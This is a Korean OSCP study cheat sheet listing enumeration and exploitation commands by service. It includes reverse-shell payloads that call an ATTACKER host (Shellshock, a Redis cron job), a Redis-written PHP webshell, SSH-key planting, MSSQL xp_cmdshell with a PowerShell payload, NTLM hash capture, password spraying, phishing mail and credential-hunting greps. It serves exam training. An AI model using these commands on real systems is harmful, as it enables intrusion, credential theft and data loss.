---
title: "열거 (Enumeration)"
date: 2026-06-20
weight: 20
draft: false
tags: ["oscp", "cheatsheet"]
summary: "서비스별 열거 명령 레퍼런스. 열린 포트를 확인하면 해당 섹션의 명령부터 돌린다."
---

서비스별 열거 명령 레퍼런스. 열린 포트를 확인하면 해당 섹션의 명령부터 돌린다.

- 출처: https://heretek.dev/oscp-cheatsheet/enumeration/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 일반 원칙 (General Principles)

- 호스트명을 발견하면 (페이지 소스, SSL 인증서, 에러 페이지, HTTP 헤더) 반드시 /etc/hosts 에 추가:

```bash
echo "$ip  hostname.domain.local" | sudo tee -a /etc/hosts
```

- 발견한 모든 버전은 searchsploit — 넓게 먼저, 좁게 나중 (`Apache 2.4.49` 전에 `Apache 2.4`)

## HTTP/HTTPS (80, 443, 8080+)

### 자동 정찰 (병렬 실행)

```bash
# 기술 식별
whatweb http://$ip
# Wappalyzer 브라우저 확장도 사용

# Nikto (빠른 취약점 스캔)
nikto -h http://$ip -o nikto.txt

# 디렉터리 브루트포스 — 두 단어목록으로 커버리지 확보
feroxbuster -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# 가상 호스트 / 서브도메인 (도메인 알 때)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
gobuster vhost -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### 수동 확인

- 브라우저로 모든 페이지 방문, 무엇이든 클릭
- 모든 페이지에서 소스 보기 — 주석, hidden 필드, JS 파일, 버전 번호
- 확인: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, `phpinfo.php`
- SSL 인증서 확인 (HTTPS) — 호스트명, 이메일 주소가 나온다
- cgi-bin 확인 → 발견 시 `.sh`, `.pl`, `.cgi` 파일 퍼징 (Shellshock!):

```bash
gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi
# Shellshock 테스트:
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" http://$ip/cgi-bin/script.sh
```

- API로 의심되면 엔드포인트 퍼징:

```bash
gobuster dir -u http://$ip/api -w /usr/share/wordlists/dirb/big.txt
ffuf -u http://$ip/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

### Burp Suite 워크플로

Burp Community (Proxy → Intercept) 용도:

- 요청 가로채기·수정 (파라미터, 메서드, 헤더 변경)
- 요청/응답 전체 쌍 확인
- Repeater: 요청을 빠르게 재전송·수정
- Decoder: 페이로드 인코딩·디코딩
- 파라미터에 SQLi, SSTI, 커맨드 인젝션 수동 테스트

### WordPress Admin → RCE

WP admin creds 확보 시:

- Appearance → Theme Editor → `404.php`
- 내용을 PHP 리버스 셸로 교체
- 트리거: `http://$ip/wp-content/themes/<theme-name>/404.php`

## SMB (139, 445)

```bash
# 인증 없이
enum4linux-ng -A $ip
smbclient -L //$ip -N
smbmap -H $ip
netexec smb $ip -u '' -p '' --shares
nmap --script smb-vuln* -p 445 $ip

# 인증 후
netexec smb $ip -u 'user' -p 'pass' --shares --users
smbmap -H $ip -u 'user' -p 'pass'
smbclient //$ip/share -U 'DOMAIN/user%pass'
```

### 공유 전체 다운로드

```bash
smbclient //$ip/share -U 'user%pass' -c 'recurse;prompt;mget *'
# 대화형으로:
smbclient //$ip/share -U 'user%pass'
mask ""
recurse ON
prompt OFF
mget *
```

다운로드한 파일은 grep: `grep -ri 'password\|credential\|secret' .`

### 대용량 데이터 덤프 검색 (SMB loot, 웹 루트, git 저장소 공통)

```bash
# 1단계: 구조부터 파악
tree dumped_data/ -L 2
# 또는: find dumped_data/ -type d | head -20

# 2단계: 흥미로운 파일명 찾기
find dumped_data/ -iname '*.config' -o -iname '*.bak' -o -iname '*.env' -o -iname '*.old' -o -iname '*.sql' -o -iname '*.log' -o -iname '.git' 2>/dev/null

# 3단계: 노이즈 필터를 걸고 내용 검색
grep -ri 'connectionstring\|password=\|pwd=\|user id=' dumped_data/ 2>/dev/null | grep -vi 'jquery\|\.js:\|deps.json\|nupkg\|\.dll'

# 4단계: 찾은 파일 읽기
cat dumped_data/path/to/interesting.config
```

흔한 실수:

- `-r` 없는 grep = 하위 디렉터리를 재귀 검색하지 않음
- 노이즈 필터 없는 `grep -ri password` = jQuery가 출력을 뒤덮음
- `dir /s` 로 C: 전체 검색 = 너무 느리다. 웹 루트부터 확인

### 빠른 데이터 추출 (파일 읽기에 시간 낭비 금지)

1단계 — 다운로드 전에 목록부터 (몇 초):

```bash
# 재귀 디렉터리 목록 — 다운로드 없이 전체 파일 확인
smbmap -H $ip -u 'user' -p 'pass' -R
# nxc로:
nxc smb $ip -u 'user' -p 'pass' --shares
```

2단계 — 다운로드 없이 키워드 스파이더 (가장 빠름):

```bash
# nxc spider_plus — 모든 공유를 크롤해 파일 목록을 JSON으로 덤프
nxc smb $ip -u 'user' -p 'pass' -M spider_plus
# 출력은 /tmp/nxc_spider_plus/ — JSON에서 흥미로운 파일명 검토
cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool | grep -i "password\|credential\|config\|backup\|secret\|key\|id_rsa\|\.kdbx\|\.conf\|\.ini\|\.log"
```

3단계 — 공유를 로컬 마운트 (대용량에 최적):

```bash
# 로컬 디렉터리로 마운트 — 이후 일반 Linux 도구 사용 (find, grep 등)
mkdir /tmp/smb_share
sudo mount -t cifs //$ip/share /tmp/smb_share -o username=user,password=pass
# Linux 전체 기능으로 검색:
grep -ri 'password\|credential\|secret\|hash\|ntlm' /tmp/smb_share/ 2>/dev/null
find /tmp/smb_share/ -name "*.txt" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.log" -o -name "*.bak" -o -name "*.kdbx" -o -name "id_rsa" 2>/dev/null
# 끝나면 언마운트:
sudo umount /tmp/smb_share
```

4단계 — 마운트 실패 시 벌크 다운로드 + grep:

```bash
# 전부 다운로드
smbclient //$ip/share -U 'user%pass' -c 'recurse;prompt;mget *'
# 로컬에서 검색:
grep -ri 'password\|credential\|secret\|hash\|ntlm\|connectionstring' . 2>/dev/null
find . -name "*.txt" -o -name "*.conf" -o -name "*.log" -o -name "*.bak" -o -name "*.kdbx" | xargs grep -li 'password\|secret\|hash' 2>/dev/null
```

모든 대용량 덤프에 동일 적용 (SMB, FTP, 웹 스크랩, git 저장소 등):

```bash
# 아무 소스에서 파일을 받은 뒤:

# 1. 파일명 — 열어볼 가치가 있는 파일
find . -iname "*password*" -o -iname "*credential*" -o -iname "*secret*" -o -iname "*backup*" -o -iname "*dump*" 2>/dev/null
find . -iname "*.kdbx" -o -iname "*.key" -o -iname "*.pem" -o -iname "*.ppk" -o -iname "id_rsa" -o -iname "id_ed25519" 2>/dev/null
find . -iname "*.sql" -o -iname "*.db" -o -iname "*.sqlite" -o -iname "*.mdb" 2>/dev/null
find . -iname "*.bak" -o -iname "*.old" -o -iname "*.orig" -o -iname "*.save" -o -iname "*.swp" 2>/dev/null
find . -iname "*.zip" -o -iname "*.tar.gz" -o -iname "*.7z" -o -iname "*.rar" 2>/dev/null

# 2. 웹 앱 설정 — 하드코딩된 creds, DB 연결 문자열, API 키
find . -iname "web.config" -o -iname "wp-config.php" -o -iname "config.php" -o -iname ".env" -o -iname "appsettings.json" -o -iname "database.yml" -o -iname ".htpasswd" -o -iname "connections.xml" 2>/dev/null

# 3. 로그 — 평문 패스워드, 해시, 사용자명이 남는 경우가 많다
find . -iname "*.log" 2>/dev/null
# 흥미로운 로그 읽기:
# grep -i 'password\|fail\|login\|auth\|ntlm\|hash\|credential' interesting.log

# 4. 파일 내용 검색 — 마스터 grep
grep -ri 'password\|credential\|secret\|hash\|ntlm\|connectionstring\|pwd=\|pass=\|api_key\|apikey\|token\|mysql_connect\|db_password\|jdbc:' . 2>/dev/null | grep -v Binary | head -50

# 5. git 저장소 — 오래된 커밋에 삭제된 패스워드가 남는다
find . -name ".git" -type d 2>/dev/null
# 발견 시:
# cd /path/to/repo && git log --oneline && git log -p | grep -i 'password\|secret\|key\|token'

# 6. 하드코딩 creds이 든 소스 코드
find . -iname "*.php" -o -iname "*.py" -o -iname "*.js" -o -iname "*.aspx" -o -iname "*.jsp" -o -iname "*.conf" -o -iname "*.ini" -o -iname "*.xml" 2>/dev/null | xargs grep -li 'password\|passwd\|pwd\|secret\|conn.*string' 2>/dev/null

# 7. 최근 수정 파일 (관련성 높을 확률)
find . -type f -mtime -90 -ls 2>/dev/null | head -30

# 8. 숨김 파일 — 관리자가 숨겨둔 dotfile
find . -name ".*" -type f 2>/dev/null

# 9. 압축 파일 — 풀어서 내부 검색
# unzip backup.zip -d backup_extracted/
# tar xzf backup.tar.gz -C backup_extracted/
# 푼 폴더에서 같은 검색 재실행
```

모든 것을 찾는 원라이너 (가장 먼저 복붙):

```bash
find . \( -iname "*.log" -o -iname "*.bak" -o -iname "*.sql" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.env" -o -iname "*.kdbx" -o -iname "*.key" -o -iname "id_rsa" -o -iname "*.old" -o -iname "*password*" -o -iname "*backup*" -o -iname "*.db" -o -iname ".htpasswd" -o -iname "wp-config*" -o -iname "web.config" \) 2>/dev/null
```

규칙: 모든 데이터 덤프에서 이 원라이너를 가장 먼저 실행한다. 흥미로운 파일을 읽고, 그다음 필요할 때 더 깊이 파낸다.

### 웹 앱 설정 파일 — creds이 나오는 곳 (모든 SMB 덤프 / 웹 루트에서 실행)

SMB 공유나 웹 루트에 접근하면 DB 연결 문자열이 든 설정 파일을 가장 먼저 찾는다. 모든 웹 앱은 DB creds를 설정 파일에 둔다.

```bash
# 1. 설정 파일 찾기 — 최우선
find . -iname "web.config" -o -iname "wp-config.php" -o -iname "config.php" -o -iname ".env" -o -iname "appsettings.json" -o -iname "database.yml" -o -iname "settings.py" 2>/dev/null

# 2. 연결 문자열 grep (프레임워크 노이즈 제외)
grep -ri "connectionstring\|password=\|pwd=\|user id=\|data source=\|db_password\|mysql_connect" . 2>/dev/null | grep -v Binary | grep -vi "jquery\|\.js:\|\.css:\|deps.json\|nupkg\|\.dll\|node_modules"
```

플랫폼별 설정 파일 위치:

- DNN/DotNetNuke: `web.config` (wwwroot) — SQL user/pass 가 든 connectionStrings
- WordPress: `wp-config.php` — DB_USER, DB_PASSWORD, DB_HOST
- ASP.NET: `web.config` 또는 `appsettings.json` — connectionStrings 섹션
- PHP (Laravel): `.env` — DB_PASSWORD, APP_KEY, MAIL_PASSWORD
- PHP (일반): `config.php`, `db.php` — db_pass, mysqli_connect()
- Umbraco: `web.config` (IIS) — connectionStrings + Umbraco 키
- XAMPP: `phpMyAdmin/config.inc.php` — MySQL root 패스워드

DB creds 발견 → 연결해서 users 덤프:

```bash
# MSSQL
impacket-mssqlclient "dbuser:dbpassword"@TARGET -port PORT
# 이후: SELECT Username, Password FROM Users;

# MySQL
mysql -h TARGET -u dbuser -p"dbpassword"
# 이후: SELECT user, password FROM mysql.user;
```

SMB 덤프 grep 시 노이즈 제외:

```bash
# 나쁨 (jQuery, 프레임워크 파일로 수천 건 오탐)
grep -ri "password" . 2>/dev/null

# 좋음 (설정 패턴만 노리고 노이즈 제외)
grep -ri "password=\|pwd=\|connectionstring\|user id=" . 2>/dev/null | grep -vi "jquery\|\.js:\|\.css:\|deps.json\|nupkg"
```

## SNMP (161 UDP)

```bash
# 커뮤니티 문자열 브루트포스
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip

# 찾은 커뮤니티 문자열로 열거
snmpcheck -t $ip -c public
snmpwalk -c public -v2c $ip
```

### Windows SNMP OID (암기)

```bash
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25       # 사용자명
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2      # 실행 프로세스
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2      # 설치된 소프트웨어
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3        # 열린 TCP 포트
```

## DNS (53)

```bash
# 존 전송 (둘 다 시도)
dig AXFR @$ip <domain>
host -l <domain> $ip

# 서브도메인 열거
dnsrecon -d <domain> -t std
dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
dnsenum <domain>

# 역방향 조회 (서브넷의 호스트명 찾기)
for i in $(seq 1 254); do host 10.10.10.$i $ip; done | grep -v "not found"
nslookup $ip $ip
```

## LDAP (389, 636)

```bash
# 익명 바인드
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=domain,DC=com"

# 인증 후
ldapsearch -x -H ldap://$ip -D 'DOMAIN\user' -w 'password' -b "DC=domain,DC=com"

# windapsearch (AD에서 빠름)
python3 windapsearch.py --dc-ip $ip -u 'user' -p 'pass' --da --privileged-users
```

## FTP (21)

```bash
ftp $ip                # anonymous:anonymous 시도
# FTP 내부에서:
ls -la
binary                 # 비텍스트 파일용 바이너리 모드 전환
get <file>
put <file>             # 업로드 테스트 — FTP 루트 = 웹 루트면 웹셸 업로드
```

FTP 루트가 웹 루트와 겹치면 → PHP/ASP 웹셸 업로드 → 브라우저로 트리거.

## SMTP (25)

### 열거

```bash
# 배너 그랩 — 소프트웨어, 버전, 호스트명, 때론 도메인명까지 나온다
nc -nv $ip 25
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip
```

### 사용자 열거 (3가지 — 전부 시도, 서버마다 막는 방식이 다르다)

```bash
# 방법 1: VRFY (가장 흔함, 자주 동작)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip

# 방법 2: EXPN (메일링 리스트 확장 — VRFY가 막혔을 때 사용자가 나오기도 한다)
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t $ip

# 방법 3: RCPT
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t $ip -D domain.com
```

### 수동 VRFY (도구 실패 시 또는 빠른 확인용)

```bash
nc -nv $ip 25
# EHLO attacker.com
# VRFY admin
# VRFY root
# VRFY john
# 252 = 사용자 존재, 550 = 없음
```

### 찾은 사용자명 활용

```bash
# 1. 패스워드 스프레이 투입
nxc smb $ip -u smtp_users.txt -p passwords.txt --continue-on-success
nxc winrm $ip -u smtp_users.txt -p passwords.txt --continue-on-success

# 2. kerbrute 투입 (AD 환경이면)
kerbrute userenum --dc DC_IP -d domain.com smtp_users.txt

# 3. AS-REP roasting 투입
impacket-GetNPUsers 'domain.com/' -usersfile smtp_users.txt -dc-ip DC_IP -no-pass

# 4. 클라이언트 공격 — 페이로드를 붙인 피싱 메일 전송
```

### 메일 전송 (AD 클라이언트 공격 / 피싱용)

```bash
# swaks — SMTP용 스위스 아미 나이프
swaks -t target@domain.com --from attacker@domain.com --attach @payload.ext --server $ip --body @body.txt --header "Subject: Important" --suppress-data -ap

# swaks가 없으면 nc로 간단 전송
nc -nv $ip 25
# EHLO attacker.com
# MAIL FROM:<attacker@domain.com>
# RCPT TO:<target@domain.com>
# DATA
# Subject: Important
# <메시지 본문>
# .
# QUIT
```

### swaks로 이메일 주소 열거

VRFY와 RCPT TO가 smtp-user-enum으로 아무것도 안 주면 swaks로 직접 확인:

```bash
# 단일 주소 테스트
sudo swaks -t user@domain.com --from test@domain.com --server $ip --body "test" --header "Subject: test"

# 출력 읽기:
# MAIL FROM -> 250 OK     = 발신자 허용 (항상 동작, 무시)
# RCPT TO  -> 250 OK      = 수신자 존재
# RCPT TO  -> 550 Unknown  = 수신자 없음

# 사용자명 루프
for user in name1 name2 name3; do
  echo -n "$user@domain.com: "
  sudo swaks -t "$user@domain.com" --from test@domain.com --server $ip --body "test" --header "Subject: test" 2>&1 | grep -oP '(250 OK|550 Unknown)'
done
```

### SMTP 인증

모든 주소가 550이면 서버가 인증을 요구하는 것일 수 있다:

```bash
# 인증 creds 사용 (git 저장소, 설정 파일, DB에서 찾은 것)
sudo swaks -t target@domain.com --from sender@domain.com --server $ip --body @body.txt --header "Subject: Important" -ap -au username -ap password
```

## NFS (2049)

```bash
showmount -e $ip
mkdir /tmp/nfs && mount -t nfs $ip:/share /tmp/nfs
ls -la /tmp/nfs
```

## MSSQL (1433)

### 연결 — 두 인증 방식 모두 시도

```bash
# Windows 인증 (도메인/로컬 Windows 계정) — 먼저 시도
impacket-mssqlclient 'user:pass'@$ip -windows-auth

# SQL 인증 (SQL Server 계정) — -windows-auth 실패 시
impacket-mssqlclient 'user:pass'@$ip

# 패스워드에 $ 가 들어있으면 bash 확장을 막는 작은따옴표 사용
impacket-mssqlclient 'user:P@ssw0rd$123'@$ip -windows-auth
```

### 연결 후 — 전체 열거 워크플로

```sql
-- 0. 현재 컨텍스트
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### 1. Impacket 헬퍼

```text
enum_db enum_logins enum_users enum_owner enum_impersonate enum_links
```

enum_impersonate에 로그인이 보이면 그 로그인으로 가장한다:

```sql
exec_as_login LOGIN_NAME
```

수동 가장:

```sql
EXECUTE AS LOGIN = 'LOGIN_NAME';
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

원래 로그인 복귀:

```sql
REVERT;
```

### 2. 데이터베이스 나열

```sql
SELECT name FROM master.sys.databases;
```

접근 가능한 DB 확인:

```sql
SELECT name, HAS_DBACCESS(name) AS has_access FROM master.sys.databases;
```

DB 전환:

```sql
USE dbname;
SELECT DB_NAME();
```

### 3. 테이블 나열

현재 DB 내부:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

다른 DB (전환 없이):

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM dbname.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

형식: `database.schema.table`

### 4. 컬럼 나열

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME, ORDINAL_POSITION;
```

흥미로운 컬럼 찾기:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%'    OR COLUMN_NAME LIKE '%user%'    OR COLUMN_NAME LIKE '%hash%'    OR COLUMN_NAME LIKE '%email%'    OR COLUMN_NAME LIKE '%login%'    OR COLUMN_NAME LIKE '%key%'    OR COLUMN_NAME LIKE '%token%' ORDER BY TABLE_NAME;
```

다른 DB:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM dbname.INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%'    OR COLUMN_NAME LIKE '%user%'    OR COLUMN_NAME LIKE '%hash%'    OR COLUMN_NAME LIKE '%email%'    OR COLUMN_NAME LIKE '%login%'    OR COLUMN_NAME LIKE '%key%'    OR COLUMN_NAME LIKE '%token%' ORDER BY TABLE_NAME;
```

### 5. 흥미로운 테이블 덤프

기본:

```sql
SELECT * FROM dbo.TableName;
```

상위 rows:

```sql
SELECT TOP 20 * FROM dbo.TableName;
```

전체 경로:

```sql
SELECT * FROM dbname.dbo.TableName;
```

### 6. Impersonation 경로

가장 가능한 대상 찾기:

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

대체 쿼리:

```sql
SELECT pe.permission_name, pe.state_desc, pr.name AS principal FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantor_principal_id = pr.principal_id WHERE pe.permission_name = 'IMPERSONATE';
```

가장 실행:

```sql
EXECUTE AS LOGIN = 'LOGIN_NAME';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

sysadmin = 1 이면:

```sql
enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
```

sysadmin = 0 이면:

```sql
SELECT name, HAS_DBACCESS(name) AS has_access FROM master.sys.databases;
```

읽을 수 있는 DB를 열거한다.

### 7. xp_cmdshell

Impacket 단축:

```text
enable_xp_cmdshell xp_cmdshell whoami
```

수동 SQL:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

`xp_cmdshell 'whoami'` 가 문법 오류를 내면:

```sql
EXEC xp_cmdshell 'whoami';
```

리버스 셸:

```sql
EXEC xp_cmdshell 'powershell -exec bypass -enc BASE64_PAYLOAD';
```

### 8. 흔한 실수

- `sp_configure` 뒤 `RECONFIGURE` 를 빼먹음 — 설정이 조용히 적용되지 않는다
- `IS_SRVROLEMEMBER('sysadmin') = 1` 확인 전에 `xp_cmdshell` 실행 — sysadmin이 아니면 시간 낭비
- `EXECUTE AS LOGIN` 뒤 `REVERT;` 를 빼먹음 — 가장 상태가 유지되어 이후 확인이 잘못된 컨텍스트로 읽힌다
- `--` 주석은 줄 끝까지 죽인다 — 주석을 SELECT에 붙이지 말고 별도 줄에 쓴다

### 9. 빠른 판단 흐름

```text
MSSQL 연결
  ↓ sysadmin 확인
  ↓ sysadmin = 1 → xp_cmdshell
  ↓ sysadmin = 0 → enum_impersonate
  ↓ 가장 가능 → EXECUTE AS LOGIN
  ↓ sysadmin 다시 확인
  ↓ 여전히 아니면 → DB 접근 권한 나열
  ↓ 읽을 수 있는 DB 찾기
  ↓ 테이블 나열
  ↓ 흥미로운 컬럼 나열
  ↓ creds 덤프
  ↓ creds를 SMB/WinRM/RDP/MSSQL에 스프레이
```

sysadmin이 아니어도 xp_cmdshell은 못 쓰지만, 사용자 테이블에서 creds는 뽑을 수 있다. 그 creds를 다른 머신에 스프레이한다.

### 레거시 열거 (빠른 확인)

```sql
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM master..syslogins;
```

### 명령 실행 (xp_cmdshell)

```sql
-- xp_cmdshell 활성화 (sysadmin 역할 필요)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### NTLMv2 해시 훔치기 (xp_cmdshell 거부 시)

```bash
# 터미널 1: Responder 시작
sudo responder -I tun0

# 터미널 2: MSSQL 클라이언트에서 내 IP로 인증 유도
EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
# 또는:
EXEC master..xp_subdirs '\\YOUR_IP\share';
```

Responder가 MSSQL 서비스 계정의 NTLMv2 해시를 잡는다 → `hashcat -m 5600` 으로 크랙

## Redis (6379) — 인증 없는 경우가 흔하다 = 공짜 셸

인증 없는 Redis는 그 자체가 기회다. 모든 시행에서 확인한다.

```bash
# 연결 테스트 (설정이 잘못됐으면 인증 불필요)
redis-cli -h $ip
> INFO                          # 서버 정보 — OS, 버전 확인
> CONFIG GET dir                # 현재 작업 디렉터리
> CONFIG GET dbfilename         # 현재 덤프 파일명
```

### 방법 1 — SSH 키 쓰기 (Linux 타깃, 선호)

```bash
# 키 쌍 생성
ssh-keygen -t rsa -f ./redis_key -N ""

# 키에 줄바꿈 패딩 (중요 — Redis RDB 포맷은 데이터 앞뒤에 정크 바이트를 붙인다)
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt

# Redis에 키를 쓰고 authorized_keys로 덤프
# FLUSHALL은 Redis 데이터를 전부 지운다 — 시험에선 괜찮지만 실제 환경에서는 위험
redis-cli -h $ip flushall
cat spaced_key.txt | redis-cli -h $ip -x set crackit
redis-cli -h $ip CONFIG SET dir /root/.ssh/
redis-cli -h $ip CONFIG SET dbfilename "authorized_keys"
redis-cli -h $ip save

# 접속
ssh -i redis_key root@$ip
```

### 방법 2 — 크론 작업 쓰기 (.ssh 디렉터리가 없을 때)

```bash
redis-cli -h $ip
> SET rev "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/crontabs/
> CONFIG SET dbfilename root
> SAVE
```

크론이 발화하기까지 최대 1분 기다린다. `nc -lvnp 4444`로 받는다.

### 방법 3 — 웹셸 쓰기 (웹 서버가 돌고 있을 때)

```bash
redis-cli -h $ip
> CONFIG SET dir /var/www/html/
> SET shell "<?php system($_GET['cmd']); ?>"
> CONFIG SET dbfilename shell.php
> SAVE
```

`http://$ip/shell.php?cmd=id` 로 접속해 실행을 확인한다.

CONFIG SET이 비활성화되어 있으면: Redis 4.x+는 MODULE LOAD를 허용할 수 있다 — GitHub에서 Redis Rogue Server exploit을 검색한다.

## RDP (3389)

```bash
xfreerdp /u:user /p:'pass' /v:$ip /cert:ignore +clipboard
xfreerdp /d:domain.com /u:user /p:'pass' /v:$ip /cert:ignore +clipboard
```

## 내부 네트워크에서 포트 스캔 (도구 없음)

nmap 없이 피벗한 상태일 때 사용한다.

```bash
# Bash (Linux)
for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &); done
for port in 21 22 80 135 139 445 3389 5985; do (echo >/dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"; done
```

```powershell
# PowerShell (Windows)
1..254 | % {Test-Connection "10.10.10.$_" -Count 1 -Quiet -TimeoutSeconds 1}
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5", $_)) "TCP port $_ is open"} 2>$null
Test-NetConnection -Port 445 10.10.10.5
```

## 대형 SMB 공유 열거 규율

`nxc --shares` 에서 기본 공유 외(apps, monitoring, scripts, backup, data)에 READ가 보이면 전부 mget하지 않는다. 아래 순서를 따른다.

### 1단계: 다운로드 없이 재귀 목록

```bash
smbclient //IP/sharename -U 'DOMAIN\user%pass' -c 'recurse ON; ls'
```

### 2단계: 고신호 파일 식별

우선순위 파일 유형:

- .ps1 .psm1 — PowerShell 스크립트
- PowerShell_transcript.*.txt — 평문 패스워드가 든 트랜스크립트
- .kdbx — KeePass 데이터베이스
- .config .xml — 연결 문자열, 자격 증명
- .log .txt — 커맨드 히스토리가 있을 수 있다
- .ini .properties — 설정
- .bat .cmd .sh — 자격 증명이 박힌 스크립트
- .ps1xml — PowerShell 모듈 정의

저신호: .exe .dll .jpg .png .msi (역분석할 바이너리가 필요한 경우가 아니면)

### 3단계: 대상 다운로드

```bash
smbclient //IP/share -U 'user%pass' -c 'recurse ON; prompt OFF; mask *.ps1; mget *; mask *.txt; mget *'
```

### 4단계: smbmap 내용 검색 (다운로드 없이)

```bash
smbmap -H IP -u user -p pass -d domain -R sharename -A 'password|secure|credential|transcript'
```

smbmap 플래그:

- -A PATTERN: 내용 검색 (파일 안쪽 grep)
- -F PATTERN: 파일명 패턴
- -R PATH: 경로부터 재귀
- --search-path PATH: 시작 위치
- --download PATH: 특정 파일 다운로드

자주 겪는 문법 함정: `--search` 는 모호하다(--search-path, --search-timeout 과 겹침). `-A` 나 `-F` 를 쓴다.

### 5단계: 다운로드한 내용 grep

```bash
grep -ri password .
grep -riE 'password|secret|credential|api[_-]?key|token|ConvertTo-SecureString|PSCredential'
```

실화: 낮은 권한 사용자가 PowerShell 트랜스크립트가 든 공유에 READ를 갖고 있었고, 그중 하나에 도메인 관리자 평문 패스워드가 있었다. 트랜스크립트는 ConvertTo-SecureString / PSCredential 로 항상 grep 한다.

올바른 grep 하나로 30초 걸렸을 일이, 앱을 전부 덤프했다면 몇 시간 걸렸을 것이다.

규칙: 다운로드 전에 목록부터 본다. 파일 유형으로 거른다. ConvertTo-SecureString 과 PSCredential 을 가장 먼저 grep 한다.
